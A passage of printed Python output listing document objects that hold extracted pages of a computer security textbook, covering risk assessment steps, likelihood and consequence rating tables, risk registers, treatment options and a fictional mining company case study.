\\nloss would seriously impact on the organization’s operation. [SASN13] describes \\nthis process as a criticality assessment that aims to identify those assets that are \\nmost important to the organization.\\nM14_STAL0611_04_GE_C14.indd   493 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 495, 'page_label': '494'}, page_content='494  CHAPTER 14 / IT SECURITY MANAGEMENT ANd\\xa0RISk ASSESSMENT\\nWhile the risk assessment process is most likely being managed by security \\nexperts, they will not necessarily have a high degree of familiarity with the orga -\\nnization’s operation and structures. Thus, they need to draw on the expertise of \\nthe people in the relevant areas of the organization to identify key assets and \\ntheir value to the organization. A key element of this process step is identifying \\nand interviewing such personnel. Many of the standards listed previously include \\nchecklists of types of assets and suggestions for mechanisms for gathering the nec -\\nessary information. These should be consulted and used. The outcome of this step \\nshould be a list of assets, with brief descriptions of their use by, and value to, the \\norganization.\\nIdentification of Threats/Risks/Vulnerabilities\\nThe next step in the process is to identify the threats or risks to which the assets \\nare exposed. This directly addresses the second of our three fundamental questions: \\n“How are those assets threatened?” It is worth commenting on the terminology used \\nhere. The terms threat and risk, while having distinct meanings, are often used inter-\\nchangeably in this context. There is considerable variation in the definitions of these \\nterms, as seen in the range of definitions provided in the cited standards. The follow-\\ning definitions will be useful in our discussion:\\nAsset: A system resource or capability of value to its owner that requires protection.\\nThreat: A potential for a threat source to exploit a vulnerability in some asset, \\nwhich if it occurs may compromise the security of the asset and cause \\nharm to the asset’s owner.\\nVulnerability: A flaw or weakness in an asset’s design, implementation, or operation and \\n management that could be exploited by some threat.\\nRisk: The potential for loss computed as the combination of the likelihood that \\na given threat exploits some vulnerability to an asset, and the magnitude \\nof harmful  consequence that results to the asset’s owner.\\nThe relationship among these and other security concepts is illustrated in Figure 1.2.\\nThe goal of this stage is to identify potentially significant risks to the assets \\nlisted. This requires answering the following questions for each asset:\\n1. Who or what could cause it harm?\\n2. How could this occur?\\nthrEat idEntifiCation Answering the first of these questions involves identify-\\ning potential threats to assets. In the broadest sense, a threat is anything that might \\nhinder or prevent an asset from providing appropriate levels of the key security \\nservices: confidentiality, integrity, availability, accountability, authenticity, and reli-\\nability. Note one asset may have multiple threats, and a single threat may target \\nmultiple assets.\\nM14_STAL0611_04_GE_C14.indd   494 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 496, 'page_label': '495'}, page_content='14.4 / dETAILEd SECURITY RISk ANALYSIS  495\\nA threat may be either natural or human-made and may be accidental or deliber-\\nate. This is known as the threat source or threat agent. The classic natural threat sources \\nare those often referred to as acts of God, and include damage caused by fire, flood, \\nstorm, earthquake, and other such natural events. It also includes environmental threats \\nsuch as long-term loss of power or natural gas. Or it may be the result of chemical \\ncontamination or leakage. Alternatively, a threat source may be a human agent acting \\neither directly or indirectly. Examples of the former include an insider retrieving and \\nselling information for personal gain, or a hacker targeting the organization’s server \\nover the Internet; an example of the latter includes someone writing and releasing a \\nnetwork worm that infects the organization’s systems. These examples all involved a \\ndeliberate exploit of a threat. However, a threat may also be a result of an accident, \\nsuch as an employee incorrectly entering information on a system, which results in the \\nsystem malfunctioning.\\nIdentifying possible threats and threat sources requires the use of a variety of \\nsources, along with the experience of the risk assessor. The chance of natural threats \\noccurring in any particular area is usually well known from insurance statistics. Lists \\nof other potential threats may be found in the standards, in the results of IT security \\nsurveys, and in information from government security agencies. The annual computer \\ncrime reports, such as those by CSI/FBI and by Verizon in the United States, and \\nsimilar reports in other countries, provide useful general guidance on the broad IT \\nthreat environment and the most common problem areas. Standards, such as NIST \\nSP 800-30 Appendix D with a taxonomy of threat sources, and Appendix E with \\nexamples of threats, may also assist here.\\nHowever, this general guidance needs to be tailored to the organization and \\nthe risk environment it operates in. This involves consideration of vulnerabilities in \\nthe organization’s IT systems, which may indicate that some risks are either more \\nor less likely than the general case. Where an organization’s security concerns are \\nsufficiently high that threats need to be specifically identified, threat scenarios can \\nbe modelled, developed, and analyzed, as described in NIST SP 800-30. Organiza -\\ntion’s define threat scenarios to describe how the tactics, techniques, and procedures \\nemployed by an attacker can contribute to, or cause, harm. The possible motiva -\\ntion of deliberate attackers in relation to the organization should be considered as \\npotentially influencing this variation in risk. In addition, any previous experience of \\nattacks seen by the organization needs to be considered, as that is concrete evidence \\nof risks that are known to occur. When evaluating possible human threat sources, \\nit is worth considering their reason and capabilities for attacking this organization, \\nincluding their:\\n• Motivation: Why would they target this organization; how motivated are they?\\n• Capability: What is their level of skill in exploiting the threat?\\n• Resources: How much time, money, and other resources could they deploy?\\n• Probability of attack: How likely and how often would your assets be targeted?\\n• Deterrence: What are the consequences to the attacker of being identified?\\nVulnErability idEntifiCation Answering the second of these questions, “How \\ncould this occur?” involves identifying flaws or weaknesses in the organization’s \\nM14_STAL0611_04_GE_C14.indd   495 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 497, 'page_label': '496'}, page_content='496  CHAPTER 14 / IT SECURITY MANAGEMENT ANd\\xa0RISk ASSESSMENT\\nIT\\xa0systems or processes that could be exploited by a threat source. This will help \\ndetermine the applicability of the threat to the organization and its significance. Note \\nthat the mere existence of some vulnerability does not mean harm will be caused to \\nan asset. There must also be a threat source for some threat that can exploit the vul-\\nnerability for harm. It is the combination of a threat and a vulnerability that creates \\na risk to an asset.\\nAgain, many of the standards listed previously include checklists of threats \\nand vulnerabilities and suggestions for tools and techniques to list them and to \\ndetermine their relevance to the organization. The outcome of this step should be \\na list of threats and vulnerabilities, with brief descriptions of how and why they \\nmight occur.\\nAnalyze Risks\\nHaving identified key assets and the likely threats and vulnerabilities they are \\nexposed to, the next step is to determine the level of risk each of these poses to the \\norganization. The aim is to identify and categorize the risks to assets that threaten \\nthe regular operations of the organization. Risk analysis also provides information \\nto management to help managers evaluate these risks and determine how best to \\ntreat them. Risk analysis involves first specifying the likelihood of occurrence of \\neach identified threat to an asset, in the context of any existing controls. Next, the \\nconsequence to the organization is determined, should that threat eventuate. Lastly, \\nthis information is combined to derive an overall risk rating for each threat. The \\nideal would be to specify the likelihood as a probability value and the consequence \\nas a monetary cost to the organization should it occur. The resulting risk is then \\nsimply given as\\nRisk = (Probability that threat occurs) * (Cost to organization)\\nThis can be directly equated to the value the threatened asset has for the  organization, \\nand hence specify what level of expenditure is reasonable to reduce the probability \\nof its occurrence to an acceptable level. Unfortunately, it is often extremely hard \\nto determine accurate probabilities, realistic cost consequences, or both. This is \\nparticularly true of intangible assets, such as the loss of confidentiality of a trade \\nsecret. Hence, many risk analyses use qualitative, rather than quantitative, ratings \\nfor both these items. The goal is then to order the resulting risks to help deter -\\nmine which need to be most urgently treated, rather than to give them an absolute  \\nvalue.\\nanalyzE Existing Controls Before the likelihood of a threat can be specified, \\nany existing controls used by the organization to attempt to minimize threats need \\nto be identified. Security controls include management, operational, and technical \\nprocesses and procedures that act to reduce the exposure of the organization to some \\nrisks by reducing the ability of a threat source to exploit some vulnerabilities. These \\ncan be identified by using checklists of existing controls, and by interviewing key \\norganizational staff to solicit this information.\\nM14_STAL0611_04_GE_C14.indd   496 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 498, 'page_label': '497'}, page_content='14.4 / dETAILEd SECURITY RISk ANALYSIS  497\\nRating\\nLikelihood \\nDescription Expanded Definition\\n1 Rare May occur only in exceptional circumstances and may be deemed as \\n“unlucky” or very unlikely.\\n2 Unlikely Could occur at some time but not expected given current controls, \\ncircumstances, and recent events.\\n3 Possible Might occur at some time, but just as likely as not. It may be difficult \\nto control its occurrence due to external influences.\\n4 Likely Will probably occur in some circumstance and one should not be \\n surprised if it occurred.\\n5 Almost Certain Is expected to occur in most circumstances and certainly sooner \\nor\\xa0later.\\nTable 14.2 Risk Likelihood\\ndEtErminE likElihood Having identified existing controls, the likelihood that \\neach identified threat could occur and cause harm to some asset needs to be specified. \\nThe likelihood is typically described qualitatively, using values and descriptions such \\nas those shown in Table 14.2.4 While the various risk assessment standards all suggest \\ntables similar to these, there is considerable variation in their detail. 5 The selection \\nof the specific descriptions and tables used is determined at the beginning of the risk \\nassessment process, when the context is established.\\nThere will very likely be some uncertainty and debate over exactly which rating \\nis most appropriate. This reflects the qualitative nature of the ratings, ambiguity in \\ntheir precise meaning, and uncertainty over precisely how likely it is that some threat \\nmay eventuate. It is important to remember that the goal of this process is to provide \\nguidance to management as to which risks exist, and provide enough information to \\nhelp management decide how to most appropriately respond. Any uncertainty in the \\nselection of ratings should be noted in the discussion on their selection, but ultimately \\nmanagement will make a business decision in response to this information.\\nThe risk analyst takes the descriptive asset and threat/vulnerability details \\nfrom the preceding steps in this process and, in light of the organization’s overall \\nrisk environment and existing controls, decides the appropriate rating. This estima-\\ntion relates to the likelihood of the specified threat exploiting one or more vulner -\\nabilities to an asset or group of assets, which results in harm to the organization. \\nWhen deliberate human-made threat sources are considered, this estimate should \\ninclude an evaluation of the attackers intent, capability, and specific targeting of \\nthis organization. The specified likelihood needs to be realistic. In particular, a \\nrating of Likely or higher suggests that this threat has occurred previously. This \\nmeans past history provides supporting evidence for its specification. If this is not \\n4This table, along with Tables 16.3 and 16.4, is adapted from those given in ISO 27005, ISO 31000, [SASN13], \\nand [SA04], but with descriptions expanded and generalized to apply to a wider range of organizations.\\n5The tables used in this chapter are chosen to illustrate a more detailed level of analysis than used in some \\nother standards, such as the three levels in FIPS199 noted in Chapter 1.\\nM14_STAL0611_04_GE_C14.indd   497 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 499, 'page_label': '498'}, page_content='498  CHAPTER 14 / IT SECURITY MANAGEMENT ANd\\xa0RISk ASSESSMENT\\nthe case, then specifying such a value would need to be justified on the basis of a \\n significantly changed threat environment, a change in the IT system that has weak-\\nened its security, or some other rationale for the threat’s anticipated likely occur -\\nrence. By contrast, the Unlikely and Rare ratings can be very hard to quantify. They \\nare an indication that the threat is of concern, but whether it could occur is difficult \\nto specify. Typically, such threats would only be considered if the consequences to \\nthe organization of their occurrence are so severe that they must be considered, \\neven if extremely improbable.\\ndEtErminE ConsEquEnCE/impaCt on organization The analyst must then spec-\\nify the consequence of a specific thr eat eventuating. Note this is distinct from, and \\nnot related to, the likelihood of the threat occurring. Rather, consequence specifica-\\ntion indicates the impact on the organization should the particular threat in question \\nactually eventuate. Even if a threat is regarded as rare or unlikely, if the organiza -\\ntion would suffer severe consequence should it occur, then it clearly poses a risk to \\nthe organization. Hence, appropriate responses must be considered. A qualitative \\ndescriptive value, such as those shown in Table 14.3, is typically used to describe the \\nconsequence. As with the likelihood ratings, there is likely to be some uncertainty as \\nto the best rating to use.\\nThis determination should be based upon the judgment of the asset’s owners, \\nand the organization’s management, rather than the opinion of the risk analyst. \\nThis is in contrast with the likelihood determination. The specified consequence \\nneeds to be realistic. It must relate to the impact on the organization as a whole \\nshould this specific threat eventuate. It is not just the impact on the affected system. \\nA particular system (e.g., a server in one location) might possibly be completely \\ndestroyed in a fire. However, the impact on the organization could vary from it \\nbeing a minor inconvenience (the server was in a branch office, and all data were \\nRating Consequence Expanded Definition\\n1 Insignificant Generally, a result of a minor security breach in a single area. Impact \\nis likely to last less than several days and requires only minor expen-\\nditure to rectify. Usually does not result in any tangible detriment to \\nthe organization.\\n2 Minor Result of a security breach in one or two areas. Impact is likely to last \\nless than a week but can be dealt with at the segment or project level \\nwithout management intervention. Can generally be rectified within \\nproject or team resources. Again, does not result in any tangible detri-\\nment to the organization, but may, in hindsight, show previous lost \\nopportunities or lack of efficiency.\\n3 Moderate Limited systemic (and possibly ongoing) security breaches. Impact \\nis likely to last up to 2 weeks and will generally require manage-\\nment intervention, though should still be able to be dealt with at the \\nproject or team level. Will require some ongoing compliance costs to \\novercome. Customers or the public may be indirectly aware or have \\nlimited information about this event.\\nTable 14.3 Risk Consequences\\n(Continued)\\nM14_STAL0611_04_GE_C14.indd   498 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 500, 'page_label': '499'}, page_content='14.4 / dETAILEd SECURITY RISk ANALYSIS  499\\nreplicated elsewhere) to catastrophic (the server had the sole copy of all customer \\nand financial records for a small business). As with the likelihood ratings, the con -\\nsequence ratings must be determined knowing the organization’s current practices \\nand arrangements. In particular, the organization’s existing backup,  disaster recov-\\nery, and contingency planning, or lack thereof, will influence the choice of rating.\\ndEtErminE rEsulting lEVEl of risk Once the likelihood and consequence of  \\neach specific threat have been identified, a final level of risk  can be assigned. This \\nis typically determined using a table that maps these values to a risk level, such as \\nthose shown in Table 14.4. This table details the risk level assigned to each combina-\\ntion. Such a table provides the qualitative equivalent of performing the ideal risk \\ncalculation using quantitative values. It also indicates the interpretation of these \\nassigned levels.\\ndoCumEnting thE rEsults in a risk rEgistEr The results of the risk analysis \\nprocess should be documented in a risk register. This should include a summary table \\nsuch that shown in Table 14.5. The risks are usually sorted in decreasing order of level. \\nThis would be supported by details of how the various items were determined, includ-\\ning the rationale, justification, and supporting evidence used. The aim of this docu -\\nmentation is to provide senior management with the information needed to make \\nappropriate decisions as how to best manage the identified risks. It also provides \\nRating Consequence Expanded Definition\\n4 Major Ongoing systemic security breach. Impact will likely last 4–8 weeks \\nand require significant management intervention and resources to \\novercome. Senior management will be required to sustain ongoing \\ndirect management for the duration of the incident and compliance \\ncosts are expected to be substantial. Customers or the public will be \\naware of the occurrence of such an event and will be in possession \\nof a range of important facts. Loss of business or organizational out-\\ncomes is possible, but not expected, especially if this is a once-off.\\n5 Catastrophic Major systemic security breach. Impact will last for 3 months or more \\nand senior management will be required to intervene for the dura-\\ntion of the event to overcome shortcomings. Compliance costs are \\nexpected to be very substantial. A loss of customer business or other \\nsignificant harm to the organization is expected. Substantial public \\nor political debate about, and loss of confidence in, the organization \\nis likely. Possible criminal or disciplinary action against personnel \\ninvolved is likely.\\n6 Doomsday Multiple instances of major systemic security breaches. Impact dura-\\ntion cannot be determined and senior management will be required \\nto place the company under voluntary administration or other form \\nof major restructuring. Criminal proceedings against senior manage-\\nment is expected, and substantial loss of business and failure to meet \\norganizational objectives is unavoidable. Compliance costs are likely \\nto result in annual losses for some years, with liquidation of the orga-\\nnization likely.\\nTable 14.3 (Continued)\\nM14_STAL0611_04_GE_C14.indd   499 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 501, 'page_label': '500'}, page_content='500  CHAPTER 14 / IT SECURITY MANAGEMENT ANd\\xa0RISk ASSESSMENT\\nAsset\\nThreat/ \\nVulnerability\\nExisting \\nControls Likelihood Consequence\\nLevel \\nof\\xa0Risk\\nRisk \\nPriority\\nInternet \\nrouter\\nOutside hacker \\nattack\\nAdmin \\n password only\\nPossible Moderate High 1\\nDestruction \\nof data  \\ncenter\\nAccidental fire \\nor flood\\nNone (no \\n disaster \\n recovery plan)\\nUnlikely Major High 2\\nTable 14.5 Risk Register\\nConsequences\\nLikelihood Doomsday Catastrophic Major Moderate Minor Insignificant\\nAlmost Certain E E E E H H\\nLikely E E E H H M\\nPossible E E E H M L\\nUnlikely E E H M L L\\nRare E H H M L L\\nRisk Level Description\\nExtreme (E) Will require detailed research and management planning at an executive/director level. \\nOngoing planning and monitoring will be required with regular reviews. Substantial \\nadjustment of controls to manage the risk is expected, with costs possibly exceeding \\noriginal forecasts.\\nHigh (H) Requires management attention, but management and planning can be left to senior \\nproject or team leaders. Ongoing planning and monitoring with regular reviews are \\nlikely, though adjustment of controls is likely to be met from within existing resources.\\nMedium (M) Can be managed by existing specific monitoring and response procedures. Management \\nby employees is suitable with appropriate monitoring and reviews.\\nLow (L) Can be managed through routine procedures.\\nTable 14.4 Risk Level Determination and Meaning\\nevidence that a formal risk assessment process has been followed if needed, and a \\nrecord of decisions made with the reasons for those decisions.\\nEvaluate Risks\\nOnce the details of potentially significant risks are determined, management needs \\nto decide whether it needs to take action in response. This would take into account \\nthe risk profile of the organization and its willingness to accept a certain level of risk, \\nas determined in the initial establishing the context phase of this process. Those items \\nwith risk levels below the acceptable level would usually be accepted with no further \\naction required. Those items with risks above this level will need to be considered \\nfor treatment.\\nM14_STAL0611_04_GE_C14.indd   500 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 502, 'page_label': '501'}, page_content='14.4 / dETAILEd SECURITY RISk ANALYSIS  501\\nFigure 14.5 Judgment about Risk Treatment\\nExtreme\\n Implement\\ntreatment\\nUneconomic\\nso accept\\n$$$$$$ Cost of treatment\\nLow\\nRisk level\\nJudgement\\nneeded\\nRisk Treatment\\nTypically, the risks with the higher ratings are those that need action most urgently. \\nHowever, it is likely that some risks will be easier, faster, and cheaper to address \\nthan others. In the example risk register shown in Table 14.5, both risks were rated \\nHigh. Further investigation reveals that a relatively simple and cheap treatment exists \\nfor the first risk by tightening the router configuration to further restrict possible \\naccesses. Treating the second risk requires developing a full disaster recovery plan, \\na much slower and more costly process. Hence, management would take the simple \\naction first to improve the organization’s overall risk profile as quickly as possible. \\nManagement may even decide that for business reasons, given an overall view of the \\norganization, some risks with lower levels should be treated ahead of other risks. This \\nis a reflection of both limitations in the risk analysis process in the range of ratings \\navailable and their interpretation, and of management’s perspective of the organiza-\\ntion as a whole.\\nFigure 14.5 indicates a range of possibilities for costs versus levels of risk. If the \\ncost of treatment is high, but the risk is low, then it is usually uneconomic to proceed \\nwith such treatment. Alternatively, where the risk is high and the cost is comparatively \\nlow, treatment should occur. The most difficult area occurs between these extremes. \\nThis is where management must make a business decision about the most effec -\\ntive use of their available resources. This decision usually requires a more detailed \\ninvestigation of the treatment options. There are five broad alternatives available to \\nmanagement for treating identified risks are as follows:\\n• Risk acceptance: Choosing to accept a risk level greater than normal for busi-\\nness reasons. This is typically due to excessive cost or time needed to treat the \\nM14_STAL0611_04_GE_C14.indd   501 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 503, 'page_label': '502'}, page_content='502  CHAPTER 14 / IT SECURITY MANAGEMENT ANd\\xa0RISk ASSESSMENT\\nrisk. Management must then accept responsibility for the consequences to the \\norganization should the risk eventuate.\\n• Risk avoidance: Not proceeding with the activity or system that creates this risk. \\nThis usually results in loss of convenience or ability to perform some function \\nthat is useful to the organization. The loss of this capability is traded off against \\nthe reduced risk profile.\\n• Risk transfer: Sharing responsibility for the risk with a third party. This is typi-\\ncally achieved by taking out insurance against the risk occurring, by entering \\ninto a contract with another organization, or by using partnership or joint ven-\\nture structures to share the risks and costs should the threat eventuate.\\n• Reduce consequence: By modifying the structure or use of the assets at risk \\nto reduce the impact on the organization should the risk occur. This could \\nbe achieved by implementing controls to enable the organization to quickly \\nrecover should the risk occur. Examples include implementing an off-site \\nbackup process, developing a disaster recovery plan, or arranging for data and \\nprocessing to be replicated over multiple sites.\\n• Reduce likelihood: By implementing suitable controls to lower the chance of \\nthe vulnerability being exploited. These could include technical or administra-\\ntive controls such as deploying firewalls and access tokens, or procedures such \\nas password complexity and change policies. Such controls aim to improve the \\nsecurity of the asset, making it more difficult for an attack to succeed by reduc-\\ning the vulnerability of the asset.\\nIf either of the last two options is chosen, then possible treatment controls need \\nto be selected and their cost effectiveness evaluated. There is a wide range of avail-\\nable management, operational, and technical controls that may be used. These would \\nbe surveyed to select those that might address the identified threat most effectively \\nand to evaluate the cost to implement against the benefit gained. Management would \\nthen choose among the options as to which should be adopted and plan for their \\nimplementation. We will introduce the range of controls often used and the use of \\nsecurity plans and policies in Chapter 15, and provide further details of some specific \\ncontrol areas in Chapters 16–18.\\n 14.5 CASE STUDY: SILVER STAR MINES\\nA case study involving the operations of a fictional company Silver Star Mines  illustrates \\nthis risk assessment process.6 Silver Star Mines is the local operations of a large global \\nmining company. It has a large IT infrastructure used by numerous business areas. Its \\nnetwork includes a variety of servers, executing a range of application software typi-\\ncal of organizations of its size. It also uses applications that are far less common, some \\nof which directly relate to the health and safety of those working in the mine. Many \\nof these systems used to be isolated, with no network connections among them. \\n6This example has been adapted and expanded from a 2003 study by Peter Hoek. For our purposes, the \\nname of the original company and any identifying details have been changed.\\nM14_STAL0611_04_GE_C14.indd   502 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 504, 'page_label': '503'}, page_content='14.5 / CASE STUdY: SILVER STAR MINES  503\\nIn\\xa0recent years, they have been connected together and connected to the company’s \\nintranet to provide better management capabilities. However, this means they are \\nnow potentially accessible from the Internet, which has greatly increased the risks to \\nthese systems.\\nA security analyst was contracted to provide an initial review of the com -\\npany’s risk profile and to recommend further action for improvement. Follow -\\ning initial discussion with company management, a decision was made to adopt a \\ncombined approach  to security management. This requires the adoption of suit -\\nable baselines standards by the company’s IT support group for their systems. \\n Meanwhile, the analyst was asked to conduct a preliminary formal assessment of \\nthe key IT systems to identify those most at risk, which management could then \\nconsider for treatment.\\nThe first step was to determine the context for the risk assessment. Being in \\nthe mining industry sector places the company at the less risky end of the spectrum, \\nand consequently less likely to be specifically targeted. Silver Star Mines is part of \\na large organization, and hence is subject to legal requirements for occupational \\nhealth and safety and is answerable to its shareholders. Thus, management decided \\nthat it wished to accept only moderate or lower risks in general. The boundar -\\nies for this risk assessment were specified to include only the systems under the \\ndirect control of the Silver Star Mines operations. This excluded the wider company \\nintranet, its central servers, and its Internet gateway. This assessment is sponsored \\nby Silver Star’s IT and engineering managers, with results to be reported to the \\ncompany board. The assessment would use the process and ratings described in \\nthis chapter.\\nNext, the key assets had to be identified. The analyst conducted interviews \\nwith key IT and engineering managers in the company. A number of the  engineering \\nmanagers emphasized how important the reliability of the SCADA network and \\nnodes were to the company. They control and monitor the core mining operations \\nof the company and enable it to operate safely and efficiently and, most crucially, to \\ngenerate revenue. Some of these systems also maintain the records required by law, \\nwhich are regularly inspected by the government agencies responsible for the min -\\ning industry. Any failure to create, preserve, and produce on demand these records \\nwould expose the company to fines and other legal sanctions. Hence, these systems \\nwere listed as the first key asset.\\nA number of the IT managers indicated that a large amount of critical data \\nwas stored on various file servers either in individual files or in databases. They \\nidentified the importance of the integrity of these data to the company. Some of \\nthese data were generated automatically by applications. Other data were cre -\\nated by employees using common office applications. Some of this needed to be \\navailable for audits by government agencies. There were also data on production \\nand operational results, contracts and tendering, personnel, application backups, \\noperational and capital expenditure, mine survey and planning, and exploratory \\ndrilling. Collectively, the integrity of stored data was identified as the second key \\nasset.\\nThese managers also indicated that three key systems—the Financial, Procure-\\nment, and Maintenance/Production servers—were critical to the effective opera -\\ntion of core business areas. Any compromise in the availability or integrity of these \\nM14_STAL0611_04_GE_C14.indd   503 10/11/17   3:09 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 505, 'page_label': '504'}, page_content='504  CHAPTER 14 / IT SECURITY MANAGEMENT ANd\\xa0RISk ASSESSMENT\\nsystems would impact the company’s ability to operate effectively. Hence, each of \\nthese were identified as a key asset.\\nLastly, the analyst identified e-mail as a key asset, as a result of interviews with \\nall business areas of the company. The use of e-mail as a business tool cuts across \\nall business areas. Around 60% of all correspondence is in the form of e-mail, which \\nis used to communicate daily with head office, other business units, suppliers, and \\ncontractors, as well as to conduct a large amount of internal correspondence. E-mail \\nis given greater importance than usual due to the remote location of the company. \\nHence, the collective availability, integrity, and confidentiality of mail services was \\nlisted as a key asset.\\nThis list of key assets is seen in the first column of Table 14.6, which is the risk \\nregister created at the conclusion of this risk assessment process.\\nHaving determined the list of key assets, the analyst needed to identify signifi-\\ncant threats to these assets and to specify the likelihood and consequence values. \\nThe major concern with the SCADA asset is unauthorized compromise of nodes \\nby an external source. These systems were originally designed for use on physi -\\ncally isolated and trusted networks and hence were not hardened against external \\nAsset\\nThreat/\\nVulnerability\\nExisting \\nControls Likelihood Consequence\\nLevel \\nof Risk\\nRisk \\nPriority\\nReliability and \\nintegrity of the \\nSCADA nodes \\nand network\\nUnauthorized \\nmodification of \\ncontrol system\\nLayered \\nfirewalls \\nand servers\\nRare Major High 1\\nIntegrity of \\nstored file \\nand database \\ninformation\\nCorruption, theft, \\nand loss of info\\nFirewall, \\npolicies\\nPossible Major Extreme 2\\nAvailability \\nand integrity \\nof financial \\nsystem\\nAttacks/errors \\naffecting system\\nFirewall, \\npolicies\\nPossible Moderate High 3\\nAvailability \\nand integrity of \\nprocurement \\nsystem\\nAttacks/errors \\naffecting system\\nFirewall, \\npolicies\\nPossible Moderate High 4\\nAvailability \\nand integrity of \\nmaintenance/ \\nproduction \\nsystem\\nAttacks/errors \\naffecting system\\nFirewall, \\npolicies\\nPossible Minor Medium 5\\nAvailability, \\nintegrity, and \\nconfidentiality \\nof mail services\\nAttacks/errors \\naffecting system\\nFirewall, \\next mail \\ngateway\\nAlmost \\nCertain\\nMinor High 6\\nTable 14.6 Silver Star Mines—Risk Register\\nM14_STAL0611_04_GE_C14.indd   504 10/11/17   3:09 PM'),\n",
